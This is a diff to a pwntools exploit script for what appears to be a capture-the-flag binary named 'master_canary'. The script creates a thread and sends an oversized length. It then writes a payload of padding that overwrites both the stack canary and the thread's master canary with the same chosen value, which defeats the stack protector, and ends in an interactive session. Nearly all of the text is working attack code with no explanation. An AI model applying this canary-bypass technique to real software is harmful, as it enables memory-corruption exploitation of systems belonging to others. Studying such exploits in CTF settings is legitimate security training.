@@ -4,7 +4,6 @@ context.update(log_level= 'debug')
 p = process('master_canary')
 
 p.recvrepeat(1)
-raw_input('debug: ' + str(p.pid))
 #Create a thread
 p.sendline('1')
 
@@ -15,15 +14,18 @@ p.sendline('2')
 p.recvrepeat(1)
 
 #Send size value
-p.sendline(str(0x110-8 + 1))
+size = 0x818988+8
+p.sendline(str(size))
 
 p.recvrepeat(1)
 
 #Send data
-p.sendline('a'*(0x110-8 + 1))
+canary = 'DEADBEAF'
+payload = 'a'*0x108 + canary
+payload += '\x00'*(size - len(payload) - 8) + canary
+log.info('size: ' + hex(size))
+log.info('Payload length: ' + hex(len(payload)))
+raw_input('debug : ' + str(p.pid))
+p.sendline(payload)
 
-#Saving the canary
-_recv = p.recvrepeat(1).split('1.')[0][-7:]
-log.info('recv: ' + _recv.encode('hex'))
-#log.info('canary: ' + hex(canary))
 p.interactive()
